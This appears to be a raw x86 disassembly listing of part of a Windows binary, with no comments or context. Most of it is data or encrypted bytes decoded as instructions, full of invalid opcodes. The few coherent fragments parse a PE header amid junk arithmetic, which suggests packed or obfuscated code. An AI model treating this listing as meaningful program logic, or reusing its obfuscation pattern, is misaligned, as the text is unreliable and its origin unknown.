  40f1f8:	test   eax,0x1e5f8822
  40f1fd:	add    DWORD PTR [eax+ebx*2-0x58a3b7ce],esp
  40f204:	jne    0x40f202
  40f206:	and    al,0x7f
  40f208:	nop
  40f209:	mov    eax,0xa70f8990
  40f20e:	into   
  40f20f:	test   DWORD PTR [ebx-0x4d],ebp
  40f212:	xor    eax,0x637af94d
  40f217:	jae    0x40f1f3
  40f219:	daa    
  40f21a:	lea    ebx,ds:0x67ad9205
  40f220:	mov    DWORD PTR [edx+eiz*4+0x5b6c6a6b],eax
  40f227:	dec    edi
  40f228:	push   0x26de5109
  40f22d:	dec    edi
  40f22e:	popa   
  40f22f:	jae    0x40f1c9
  40f231:	test   eax,0x9d049cf5
  40f236:	dec    esi
  40f237:	sbb    esi,DWORD PTR [ebp+0x26]
  40f23a:	stos   BYTE PTR es:[edi],al
  40f23b:	fadd   QWORD PTR [ebp-0x1a]
  40f23e:	in     al,dx
  40f23f:	int    0x91
  40f241:	(bad)  
  40f242:	jmp    0xadf:0x83f433d0
  40f249:	fdivr  DWORD PTR [esp+ebp*4]
  40f24c:	xchg   esi,eax
  40f24d:	pop    edi
  40f24e:	sbb    al,0x11
  40f250:	add    eax,0x4cd3657c
  40f255:	(bad)  
  40f256:	(bad)  
  40f257:	mov    ch,0x11
  40f259:	xchg   esp,eax
  40f25a:	nop
  40f25b:	push   DWORD PTR [ebp-0x8]
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx-0x8c0c427]
  40f282:	ret    
  40f283:	popa   
  40f284:	stos   BYTE PTR es:[edi],al
  40f285:	jl     0x40f303
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f22b
  40f28c:	sub    DWORD PTR [ecx-0x12eaf953],0x34
  40f293:	lock sub bl,ch
  40f296:	(bad)  
  40f297:	outs   dx,DWORD PTR ds:[esi]
  40f298:	imul   esi,DWORD PTR [edi+0x2c097e8],0x61ffb37b
  40f2a2:	ror    BYTE PTR [eax+0x3b61db79],1
  40f2a8:	fdiv   DWORD PTR [eax-0x44]
  40f2ab:	xchg   edi,eax
  40f2ac:	das    
  40f2ad:	pop    edx
  40f2ae:	pop    edi
  40f2af:	out    0x79,al
  40f2b1:	out    0xf9,eax
  40f2b3:	mov    DWORD PTR [edx+0x26edb43c],0xfcb95259
  40f2bd:	test   al,0x3d
  40f2bf:	call   0xa752:0x6043a0c4
  40f2c6:	dec    ebx
  40f2c7:	inc    ebx
  40f2c8:	mov    eax,0xdc14566a
  40f2cd:	leave  
  40f2ce:	mov    WORD PTR ds:0x7c80d52a,?
  40f2d4:	adc    DWORD PTR [edx+ebp*4],ecx
  40f2d7:	adc    ch,BYTE PTR [esi-0x1b]
  40f2da:	adc    bl,BYTE PTR [edx+ebp*4-0x36f88bca]
  40f2e1:	ins    BYTE PTR es:[edi],dx
  40f2e2:	lahf   
  40f2e3:	aas    
  40f2e4:	dec    esi
  40f2e5:	xor    al,0xad
  40f2e7:	ja     0x40f322
  40f2e9:	popa   
  40f2ea:	mov    BYTE PTR [edi+0x36],0xb1
  40f2ee:	inc    BYTE PTR [edi+0x26]
  40f2f1:	mov    eax,gs:0x44abfb6c
  40f2f7:	dec    esi
  40f2f8:	ins    DWORD PTR es:[edi],dx
  40f2f9:	int3   
  40f2fa:	pusha  
  40f2fb:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40f2fd:	or     eax,0xeec61e3d
  40f302:	mov    edx,0x4890ea5d
  40f307:	cmp    DWORD PTR ds:0xff4b1db6,ebp
  40f30d:	cmp    DWORD PTR [ebp+0x6f],ebx
  40f310:	ins    BYTE PTR es:[edi],dx
  40f311:	pop    esp
  40f312:	and    BYTE PTR [eax+0x59],dl
  40f315:	add    al,0xa4
  40f317:	sub    eax,0x530ea1e7
  40f31c:	push   ebx
  40f31d:	call   DWORD PTR [edx]
  40f31f:	and    al,0x1b
  40f321:	sbb    BYTE PTR [ecx+edi*2-0x49],al
  40f325:	or     DWORD PTR [eax+ecx*1],esp
  40f328:	fidivr WORD PTR [eax]
  40f32a:	mov    WORD PTR [ecx+edx*1+0x746847e5],ds
  40f331:	sahf   
  40f332:	pop    eax
  40f333:	pop    ss
  40f334:	out    dx,al
  40f335:	in     al,0x8f
  40f337:	sbb    DWORD PTR [ebx],ecx
  40f339:	add    al,0x2b
  40f33b:	adc    ah,bl
  40f33d:	jle    0x40f389
  40f33f:	jg     0x40f2fd
  40f341:	sub    al,0x19
  40f343:	das    
  40f344:	pop    edx
  40f345:	push   ebx
  40f346:	or     edx,edi
  40f348:	ds and al,0x19
  40f34b:	dec    ecx
  40f34c:	nop/reserved BYTE PTR [esi-0x3817b0eb]
  40f353:	mov    ds:0x35263029,al
  40f358:	sub    ah,BYTE PTR [eax+0x6324ffbb]
  40f35e:	inc    edi
  40f35f:	es inc esi
  40f361:	imul   esp,edx,0xfffffff5
  40f364:	and    dl,BYTE PTR ds:0xc5bdbf59
  40f36a:	hlt    
  40f36b:	lahf   
  40f36c:	arpl   WORD PTR ss:[ebp+0x75],bx
  40f370:	rol    ecx,cl
  40f372:	stos   DWORD PTR es:[edi],eax
  40f373:	scas   eax,DWORD PTR es:[edi]
  40f374:	stos   BYTE PTR es:[edi],al
  40f375:	aas    
  40f376:	sub    bl,BYTE PTR [edx+eiz*4-0x56c7515d]
  40f37d:	sbb    al,0x97
  40f37f:	scas   eax,DWORD PTR es:[edi]
  40f380:	idiv   DWORD PTR [edx]
  40f382:	pop    edx
  40f383:	popf   
  40f384:	jmp    0xdbb11dae
  40f389:	inc    esp
  40f38a:	iret   
  40f38b:	push   edi
  40f38c:	xor    DWORD PTR [ecx],ecx
  40f38e:	sub    al,0x8a
  40f390:	jl     0x40f3cd
  40f392:	ja     0x40f38d
  40f394:	mov    dl,0xe3
  40f396:	xor    BYTE PTR [edi+0x693adcda],dl
  40f39c:	cmc    
  40f39d:	mov    cl,0x2d
  40f39f:	stos   DWORD PTR es:[edi],eax
  40f3a0:	rcl    DWORD PTR [esi],cl
  40f3a2:	mov    ch,0x39
  40f3a4:	inc    DWORD PTR [eax+0x4d]
  40f3a7:	aad    0x87
  40f3a9:	mov    esi,0x106bff15
  40f3ae:	ror    ch,cl
  40f3b0:	add    ecx,ebx
  40f3b2:	sbb    ah,BYTE PTR [ebx-0x31]
  40f3b5:	mov    ds:0x513b834f,al
  40f3ba:	jae    0x40f34c
  40f3bc:	mov    ds:0x71690044,eax
  40f3c1:	or     edi,DWORD PTR cs:[edx+0x4a]
  40f3c5:	fstp   TBYTE PTR [edi+0x5a069cc1]
  40f3cb:	(bad)  
  40f3cc:	jmp    0xdeec1288
  40f3d1:	js     0x40f3d4
  40f3d3:	pop    ss
  40f3d4:	das    
  40f3d5:	adc    al,BYTE PTR [edi+ebx*1+0x7b]
  40f3d9:	popf   
  40f3da:	sbb    DWORD PTR [ecx+0x51],ecx
  40f3dd:	in     al,dx
  40f3de:	jmp    0xaa4c:0x9309af67
  40f3e5:	adc    eax,0xc6caf49c
  40f3ea:	push   edx
  40f3eb:	add    dh,BYTE PTR [ebx-0x186de9f2]
  40f3f1:	push   edi
  40f3f2:	mov    ecx,0xdf1febcd
  40f3f7:	jp     0x40f3ec
  40f3f9:	pop    ebx
  40f3fa:	scas   eax,DWORD PTR es:[edi]
  40f3fb:	pushf  
  40f3fc:	aas    
  40f3fd:	push   ebp
  40f3fe:	es sub eax,0xc33b06ed
  40f404:	cdq    
  40f405:	xlat   BYTE PTR ds:[ebx]
  40f406:	in     eax,dx
  40f407:	ret    
  40f408:	mov    al,bl
  40f40a:	sti    
  40f40b:	jl     0x40f445
  40f40d:	jle    0x40f467
  40f40f:	stos   BYTE PTR es:[edi],al
  40f410:	scas   al,BYTE PTR es:[edi]
  40f411:	xchg   ebp,eax
  40f412:	dec    ebp
  40f413:	add    al,0xe3
  40f415:	or     al,0x70
  40f417:	adc    DWORD PTR [ecx],0xffffffc6
  40f41a:	adc    eax,0x1864a428
  40f41f:	ret    
  40f420:	or     ecx,eax
  40f422:	or     edx,DWORD PTR [ebx]
  40f424:	(bad)  
  40f425:	ds mov dl,0x7f
  40f428:	mov    WORD PTR [ebp+0x39],fs
  40f42b:	pop    eax
  40f42c:	sub    ah,BYTE PTR [eax+ebx*4+0x378e848f]
  40f433:	idiv   BYTE PTR [eax+0x40]
  40f436:	leave  
  40f437:	fild   DWORD PTR [esi+0x11b01a55]
  40f43d:	pop    eax
  40f43e:	and    ah,0x71
  40f441:	ds icebp 
  40f443:	sub    al,0x7
  40f445:	push   ecx
  40f446:	test   BYTE PTR [edi+eax*4],bl
  40f449:	outs   dx,BYTE PTR ds:[esi]
  40f44a:	cmp    edi,0xf6283e6d
  40f450:	adc    al,0xbb
  40f452:	adc    eax,0xd125c57e
  40f457:	loop   0x40f460
  40f459:	out    dx,eax
  40f45a:	jge    0x40f3f5
  40f45c:	call   0xf3bf1f1b
  40f461:	pop    es
  40f462:	cmp    bh,BYTE PTR [edx-0x47730f87]
  40f468:	push   eax
  40f469:	loope  0x40f455
  40f46b:	xlat   BYTE PTR ds:[ebx]
  40f46c:	push   ebp
  40f46d:	mov    ebp,0xb188f11e
  40f472:	shl    ecx,cl
  40f474:	inc    ebp
  40f475:	mov    ds:0xd5e8eb9b,al
  40f47a:	ins    DWORD PTR es:[edi],dx
  40f47b:	dec    edi
  40f47c:	out    dx,eax
  40f47d:	nop
  40f47e:	lods   al,BYTE PTR ds:[esi]
  40f47f:	stos   DWORD PTR es:[edi],eax
  40f480:	push   ebx
  40f481:	not    BYTE PTR [eax]
  40f483:	push   ss
  40f484:	or     DWORD PTR [eax-0x1f324e9d],eax
  40f48a:	adc    edi,DWORD PTR [edx+0x516b45ab]
  40f490:	retf   
  40f491:	je     0x40f431
  40f493:	mov    eax,ds:0x8a15eb15
  40f498:	fsubr  st,st(6)
  40f49a:	dec    edi
  40f49b:	dec    eax
  40f49c:	jo     0x40f51b
  40f49e:	pop    ebx
  40f49f:	loop   0x40f504
  40f4a1:	js     0x40f48c
  40f4a3:	pop    esi
  40f4a4:	(bad)  
  40f4a5:	sub    BYTE PTR [edi+0x2a],bh
  40f4a8:	xchg   edi,eax
  40f4a9:	fnstcw WORD PTR [ecx-0x416125a5]
  40f4af:	out    0x22,eax
  40f4b1:	and    eax,0xadabd5c2
  40f4b6:	mov    ecx,0x490fb4cb
  40f4bb:	int3   
  40f4bc:	(bad)  
  40f4bd:	xchg   ebx,eax
  40f4be:	push   0xb7f7e1c4
  40f4c3:	aam    0xd2
  40f4c5:	xchg   DWORD PTR [ebx+ebp*1+0xd7bdaa2],ecx
  40f4cc:	inc    ebx
  40f4cd:	jge    0x40f46f
  40f4cf:	iret   
  40f4d0:	fdiv   st,st(7)
  40f4d2:	push   0x2dd8624
  40f4d7:	xchg   esp,eax
  40f4d8:	mov    ecx,0x89e69909
  40f4dd:	rcl    BYTE PTR [ebp-0x1c5a6fe9],1
  40f4e3:	stos   DWORD PTR es:[edi],eax
  40f4e4:	cli    
  40f4e5:	and    DWORD PTR [bx+di],ebx
  40f4e8:	pop    esp
  40f4e9:	or     al,0x6a
  40f4eb:	cdq    
  40f4ec:	jge    0x40f48f
  40f4ee:	fld    QWORD PTR fs:[edi]
  40f4f1:	sub    eax,0x93194666
  40f4f6:	test   ecx,0xdfe56e13
  40f4fc:	addr16 out 0x6d,al
  40f4ff:	cli    
  40f500:	adc    bl,al
  40f502:	xchg   edi,eax
  40f503:	lock xchg ebx,eax
  40f505:	sbb    DWORD PTR [esi-0x5],esp
  40f508:	scas   al,BYTE PTR es:[edi]
  40f509:	or     edx,DWORD PTR [ebp-0xa]
  40f50c:	mov    eax,ds:0x5b4b87a8
  40f511:	pop    es
  40f512:	test   al,0x50
  40f514:	je     0x40f4d5
  40f516:	adc    al,0x5f
  40f518:	dec    ebp
  40f519:	jle    0x40f51d
  40f51b:	jno    0x40f49d
  40f51d:	mov    dl,0x65
  40f51f:	stc    
  40f520:	dec    esp
  40f521:	(bad)  
  40f522:	sahf   
  40f523:	cs and eax,0x129bf9ef
  40f529:	outs   dx,BYTE PTR ds:[esi]
  40f52a:	daa    
  40f52b:	mov    edi,ds
  40f52d:	mov    ecx,0x2a0a2d21
  40f532:	jae    0x40f560
  40f534:	mov    ds:0xeec69d2b,al
  40f539:	fidivr DWORD PTR [ebx+0x2d]
  40f53c:	push   ebp
  40f53d:	jp     0x40f4ef
  40f53f:	jmp    FWORD PTR [ecx+esi*2-0x97f4026]
  40f546:	pop    esi
  40f547:	rol    DWORD PTR [edx-0x6d3ec54],cl
  40f54d:	inc    ebp
  40f54e:	addr16 pusha 
  40f550:	shl    DWORD PTR [ecx-0x2b],1
  40f553:	(bad)  
  40f554:	mov    al,0x7a
  40f556:	jbe    0x40f514
  40f558:	and    eax,0xd6817c07
  40f55d:	fnsave [edx+0x35]
  40f560:	push   edx
  40f561:	(bad)  
  40f562:	ficomp WORD PTR es:[esi-0x3ff5cbc8]
  40f569:	(bad)  
  40f56a:	or     eax,0xb6c7b58d
  40f56f:	test   al,0xc7
  40f571:	gs dec edx
  40f573:	mov    ebp,0xda310161
  40f578:	sbb    DWORD PTR [eax+ecx*8-0x36],edi
  40f57c:	out    0x4d,eax
  40f57e:	call   0xc0af:0x91e0bc9c
  40f585:	xor    BYTE PTR ds:0xf6f9dd97,dl
  40f58b:	(bad)  
  40f58c:	sub    eax,0xe848ea6
  40f591:	pushf  
  40f592:	mov    ecx,0xe0f358fc
  40f597:	xor    eax,esi
  40f599:	inc    ebx
  40f59a:	mov    ecx,0x65a873f8
  40f59f:	jae    0x40f535
  40f5a1:	xlat   BYTE PTR ds:[ebx]
  40f5a2:	leave  
  40f5a3:	jns    0x40f585
  40f5a5:	mov    esi,0xfb375e6d
  40f5aa:	inc    ebx
  40f5ab:	xor    dh,ch
  40f5ad:	inc    edi
  40f5ae:	fs retf 
  40f5b0:	(bad)  
  40f5b1:	fimul  WORD PTR [eax+eiz*1+0x1208d990]
  40f5b8:	sbb    BYTE PTR [ebp+0x38],ah
  40f5bb:	jmp    0x40f57d
  40f5bd:	xchg   ebp,eax
  40f5be:	mov    edi,0xa97718d
  40f5c3:	push   0xffffffbf
  40f5c5:	and    eax,0xf95b2181
  40f5ca:	adc    DWORD PTR [edi+0x9],edi
  40f5cd:	sub    al,0x51
  40f5cf:	es es push cs
  40f5d2:	adc    DWORD PTR [eax],edi
  40f5d4:	loopne 0x40f623
  40f5d6:	adc    eax,0xc40c6604
  40f5db:	test   BYTE PTR [edx+0x30cc399b],bh
  40f5e1:	xchg   ecx,eax
  40f5e2:	mov    ecx,esi
  40f5e4:	mov    edx,0xe7527d5
  40f5e9:	daa    
  40f5ea:	jnp    0x40f66b
  40f5ec:	mov    edx,0xe44f8a7b
  40f5f1:	or     eax,0x43fc0abf
  40f5f6:	fld    DWORD PTR [edi+0x55]
  40f5f9:	xchg   ebp,eax
  40f5fa:	cmc    
  40f5fb:	repnz pop ds
  40f5fd:	ins    BYTE PTR es:[edi],dx
  40f5fe:	gs ret 
  40f600:	pop    ebp
  40f601:	xor    ebp,DWORD PTR [ebx+0x57ae43ef]
  40f607:	cmp    al,0xae
  40f609:	ja     0x40f649
  40f60b:	adc    al,0x69
  40f60d:	dec    ecx
  40f60e:	ss cli 
  40f610:	aaa    
  40f611:	fisttp QWORD PTR [edx+0x75]
  40f614:	(bad)  [eax-0x77]
  40f617:	adc    BYTE PTR [ebp+0x3a],ch
  40f61a:	mov    al,ds:0x4d97ba01
  40f61f:	arpl   WORD PTR [edi+0x6a3d89a6],ax
  40f625:	cmp    ch,BYTE PTR [ecx]
  40f627:	or     eax,0x353d66eb
  40f62c:	mov    ebp,0x640361c8
  40f631:	jmp    0x40f5c0
  40f633:	push   esp
  40f634:	pop    esi
  40f635:	leave  
  40f636:	ret    0xc
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4336ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4336df,0x4336a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0x77f27bd2
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0xe47c7c7e
  40f67b:	or     eax,0x75bd263d
  40f680:	jb     0x40f669
  40f682:	xor    ebp,0x96b736a4
  40f688:	sahf   
  40f689:	pop    edx
  40f68a:	push   ebx
  40f68b:	mov    dh,0x7f
  40f68d:	sbb    eax,0x38cca49e
  40f692:	jae    0x40f649
  40f694:	arpl   WORD PTR [ebx+0x2110dffb],bx
  40f69a:	add    esi,DWORD PTR [ecx]
  40f69c:	(bad)  
  40f69e:	or     al,0x78
  40f6a0:	adc    al,dh
  40f6a2:	xor    DWORD PTR [edx-0x113b0d89],ecx
  40f6a8:	jns    0x40f673
  40f6aa:	push   edi
  40f6ab:	dec    ecx
  40f6ac:	stc    
  40f6ad:	cmp    edi,ebx
  40f6af:	inc    ebx
  40f6b0:	sti    
  40f6b1:	or     eax,0x386eff1e
  40f6b6:	lods   al,BYTE PTR ds:[esi]
  40f6b7:	adc    esi,DWORD PTR [eax+0x76]
  40f6ba:	test   DWORD PTR [ebp+0x672fe3a],edi
  40f6c0:	lods   al,BYTE PTR ds:[esi]
  40f6c1:	xchg   edx,eax
  40f6c2:	popf   
  40f6c3:	jno    0x40f6cf
  40f6c5:	scas   eax,DWORD PTR es:[edi]
  40f6c6:	adc    eax,0x41786b51
  40f6cb:	fadd   QWORD PTR [eax-0x7c]
  40f6ce:	push   esp
  40f6cf:	das    
  40f6d0:	cmp    BYTE PTR [esi+eiz*1],dl
  40f6d3:	jne    0x40f6a2
  40f6d5:	mov    dh,0x16
  40f6d7:	loop   0x40f757
  40f6d9:	push   ss
  40f6da:	shr    BYTE PTR ds:0xfdedf7a9,1
  40f6e0:	lock lods eax,DWORD PTR ds:[esi]
  40f6e2:	imul   ecx,DWORD PTR [eax],0x67
  40f6e5:	sbb    al,0xb8
  40f6e7:	and    DWORD PTR [edx+0x61827f3c],esi
  40f6ed:	mov    ah,0x1e
  40f6ef:	xchg   esi,eax
  40f6f0:	rol    esi,0x73
  40f6f3:	cmp    dl,BYTE PTR [esi]
  40f6f5:	sub    edi,DWORD PTR [edi]
  40f6f7:	and    BYTE PTR [ebp+0x6e016f65],0xd1
  40f6fe:	in     eax,0xaf
  40f700:	pop    ebx
  40f701:	mov    bl,BYTE PTR [ebp-0x39cf37fe]
  40f707:	mov    ecx,0x25e5faab
  40f70c:	mov    bl,0x4e
  40f70e:	call   0x346d3d7e
  40f713:	outs   dx,BYTE PTR ds:[esi]
  40f714:	cli    
  40f715:	retf   0x7df3
  40f718:	push   ds
  40f719:	fsubr  QWORD PTR [edi]
  40f71b:	mov    eax,ds:0x7d5c784c
  40f720:	cwde   
  40f721:	mov    ecx,0x971dba97
  40f726:	mov    esp,eax
  40f728:	stos   BYTE PTR es:[edi],al
  40f729:	jge    0x40f797
  40f72b:	push   0x2d
  40f72d:	in     eax,0xc6
  40f72f:	dec    edx
  40f730:	mov    ebx,0x4d1d909
  40f735:	xor    al,0xdc
  40f737:	sub    eax,DWORD PTR [edx]
  40f739:	pop    es
  40f73a:	stos   DWORD PTR es:[edi],eax
  40f73b:	clc    
  40f73c:	cdq    
  40f73d:	mov    ebx,0x716ab8d0
  40f742:	loope  0x40f714
  40f744:	mov    ebx,0x785e0f98
  40f749:	jmp    0xa447ad6f
  40f74e:	pop    ebp
  40f74f:	inc    eax
  40f750:	mov    dh,0x39
  40f752:	ret    0x7bfe
  40f755:	pushf  
  40f756:	retf   
  40f757:	push   edi
  40f758:	xchg   edi,eax
  40f759:	popf   
  40f75a:	inc    ebx
  40f75b:	mov    esp,0x681cd749
  40f760:	sar    cl,1
  40f762:	jmp    0x576caa7b
  40f767:	lock xor eax,0x75b06ca
  40f76d:	push   ss
  40f76e:	call   0x15da42d0
  40f773:	test   DWORD PTR [eax],ebp
  40f775:	pop    esi
  40f776:	stos   BYTE PTR es:[edi],al
  40f777:	sub    DWORD PTR [ecx+0x3e],edi
  40f77a:	test   DWORD PTR [ebx],0xaed9d4cc
  40f780:	mul    ah
  40f782:	xor    eax,0xe4121515
  40f787:	ror    DWORD PTR [ebx],cl
  40f789:	into   
  40f78a:	stos   DWORD PTR es:[edi],eax
  40f78b:	cmc    
  40f78c:	(bad)  
  40f78d:	je     0x40f7fa
  40f78f:	mov    esi,0x1a1b404f
  40f794:	leave  
  40f795:	mov    ch,0x2d
  40f797:	outs   dx,BYTE PTR ds:[esi]
  40f798:	push   ecx
  40f799:	addr16 push eax
  40f79b:	ds xor al,0x73
  40f79e:	retf   
  40f79f:	popa   
  40f7a0:	ret    0xffe1
  40f7a3:	scas   al,BYTE PTR es:[edi]
  40f7a4:	leave  
  40f7a5:	outs   dx,BYTE PTR ds:[esi]
  40f7a6:	pop    es
  40f7a7:	outs   dx,DWORD PTR ds:[esi]
  40f7a8:	in     eax,0x3a
  40f7aa:	inc    esp
  40f7ab:	inc    esi
  40f7ac:	mov    edx,0x2f7d0729
  40f7b1:	sub    ch,BYTE PTR [esi+0x8]
  40f7b4:	mov    al,es:0xc9695a39
  40f7ba:	shl    BYTE PTR [edx+0x46],1
  40f7bd:	in     eax,0x2a
  40f7bf:	cmp    al,0xed
  40f7c1:	cmp    edi,DWORD PTR ds:0x6b011274
  40f7c7:	mov    al,0x5a
  40f7c9:	mov    cs,WORD PTR ds:0xf117074d
  40f7cf:	imul   esi,DWORD PTR [esi-0x1b],0x7e669ced
  40f7d6:	fmul   st(3),st
  40f7d8:	ror    ebp,0xcb
  40f7db:	scas   al,BYTE PTR es:[edi]
  40f7dc:	mul    DWORD PTR [edi-0x33]
  40f7df:	pop    eax
  40f7e0:	mov    cl,0xd2
  40f7e2:	inc    edx
  40f7e3:	inc    ebp
  40f7e4:	jb     0x40f7f3
  40f7e6:	xchg   esi,eax
  40f7e7:	inc    ecx
  40f7e8:	out    dx,al
  40f7e9:	mov    dh,0xc
  40f7eb:	mov    cl,0x26
  40f7ed:	into   
  40f7ee:	or     bl,bh
  40f7f0:	jp     0x40f843
  40f7f2:	mov    esp,0xfcd7e262
  40f7f7:	or     BYTE PTR [esp+ecx*2+0x3d57b1ba],bh
  40f7fe:	jp     0x40f7a0
  40f800:	or     al,0x27
  40f802:	sbb    ah,bl
  40f804:	jnp    0x40f81d
  40f806:	push   esp
  40f807:	jl     0x40f855
  40f809:	push   eax
  40f80a:	js     0x40f87f
  40f80c:	fisttp WORD PTR [edi]
  40f80e:	mov    dl,0x12
  40f810:	push   es
  40f811:	jb     0x40f7ce
  40f813:	ror    DWORD PTR [esi-0xfacc77a],1
  40f819:	add    eax,0x737bb24d
  40f81e:	shl    DWORD PTR [edi-0x24ca1d0b],cl
  40f824:	and    eax,0x39c4b54e
  40f829:	jecxz  0x40f7eb
  40f82b:	or     dl,dl
  40f82d:	fidiv  WORD PTR cs:[edx-0x15]
  40f831:	imul   edi,DWORD PTR [edx-0x4f2efd34],0x1e
  40f838:	out    0x8a,eax
  40f83a:	jmp    0x40f8ad
  40f83c:	mov    ebp,0x648fcbb9
  40f841:	cs pop edi
  40f843:	cs loop 0x40f892
  40f846:	pop    ss
  40f847:	and    eax,0x910667f4
  40f84c:	test   BYTE PTR [ebx+0x10],ch
  40f84f:	xchg   esi,eax
  40f850:	repz pop ecx
  40f852:	cwde   
  40f853:	fdiv   st,st(7)
  40f855:	ja     0x40f8cf
  40f857:	xor    al,0xba
  40f859:	dec    edx
  40f85a:	mov    BYTE PTR [ebx+0x5565c6a],al
  40f860:	and    DWORD PTR [eax-0x69d9fcbd],ebx
  40f866:	push   0x5d7f10a8
  40f86b:	mov    al,ds:0x9bd35d62
  40f870:	push   ds
  40f871:	fsub   DWORD PTR [eax]
  40f873:	fisttp DWORD PTR [ecx-0x6ad4869a]
  40f879:	mov    ecx,0xce91885b
  40f87e:	sti    
  40f87f:	lods   al,BYTE PTR ds:[esi]
  40f880:	inc    ecx
  40f881:	sbb    al,0x23
  40f883:	in     al,dx
  40f884:	stc    
  40f885:	sub    al,BYTE PTR [edx+0x7]
  40f888:	stos   BYTE PTR es:[edi],al
  40f889:	mov    ebx,0xf079405c
  40f88e:	xchg   ebp,eax
  40f88f:	mov    eax,ds:0xca03c81
  40f894:	xor    ecx,DWORD PTR [edx-0x3dad6ac3]
  40f89a:	fwait
  40f89b:	stos   BYTE PTR es:[edi],al
  40f89c:	add    DWORD PTR [ebx],ebx
  40f89e:	lods   al,BYTE PTR ds:[esi]
  40f89f:	mov    edx,eax
  40f8a1:	push   ecx
  40f8a2:	push   esp
  40f8a3:	daa    
  40f8a4:	pop    ss
  40f8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8a6:	xchg   esi,eax
  40f8a7:	stc    
  40f8a8:	xor    dl,cl
  40f8aa:	mov    bl,0x73
  40f8ac:	cld    
  40f8ad:	mov    edi,0x427c1aff
  40f8b2:	sbb    al,0x57
  40f8b4:	scas   eax,DWORD PTR es:[edi]
  40f8b5:	imul   esi,DWORD PTR ds:0xf07a8ee7,0xffffffda
  40f8bc:	mov    eax,ds:0xc22ab155
  40f8c1:	std    
  40f8c2:	sub    al,0x98
  40f8c4:	mov    al,ds:0xc1a96c19
  40f8c9:	retf   
  40f8ca:	xor    BYTE PTR [edx-0x7d],dl
  40f8cd:	and    eax,0x4b961044
  40f8d2:	js     0x40f85c
  40f8d4:	push   edi
  40f8d5:	pop    ss
  40f8d6:	(bad)  
  40f8d7:	xor    BYTE PTR [edi],ch
  40f8d9:	not    BYTE PTR [esp+ebp*4-0x3e]
  40f8dd:	stos   BYTE PTR es:[edi],al
  40f8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8df:	xor    edx,DWORD PTR [ebx-0x78]
  40f8e2:	stos   BYTE PTR es:[edi],al
  40f8e3:	cmc    
  40f8e4:	cs (bad) 
  40f8e6:	loopne 0x40f8c3
  40f8e8:	loope  0x40f8e5
  40f8ea:	(bad)  
  40f8eb:	nop
  40f8ec:	cdq    
  40f8ed:	adc    eax,0xbc46c5d3
  40f8f2:	lock xchg BYTE PTR [eax+0x54ba5af1],cl
  40f8f9:	fisttp DWORD PTR [ebx]
  40f8fb:	lea    edi,[ecx]
  40f8fd:	jae    0x40f8ba
  40f8ff:	xlat   BYTE PTR ds:[ebx]
  40f900:	mov    ecx,0x84562099
  40f905:	jns    0x40f936
  40f907:	mov    bl,0x5a
  40f909:	cmp    dh,BYTE PTR [edx-0x1c29814d]
  40f90f:	mov    ah,0x76
  40f911:	stos   DWORD PTR es:[edi],eax
  40f912:	push   eax
  40f913:	cli    
  40f914:	and    BYTE PTR [ebx+ebx*1-0x1f],bl
  40f918:	ror    BYTE PTR [eax+eiz*2-0x7e],1
  40f91c:	out    0x9b,eax
  40f91e:	push   ss
  40f91f:	xlat   BYTE PTR ds:[ebx]
  40f920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f921:	lahf   
  40f922:	fstp   DWORD PTR [esi-0x7ec6fb18]
  40f928:	and    eax,0x43372b
  40f92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f92e:	ss inc ebx
  40f930:	add    BYTE PTR [eax*2-0x7af03cc4],dh
  40f937:	add    DWORD PTR [eax],0xca130000
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43365f
  40f947:	add    DWORD PTR ds:0x433647,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43372f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433717,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4336a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433763
  40f97f:	adc    ecx,DWORD PTR ds:0x4336ab
  40f985:	mov    DWORD PTR ds:0x433763,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
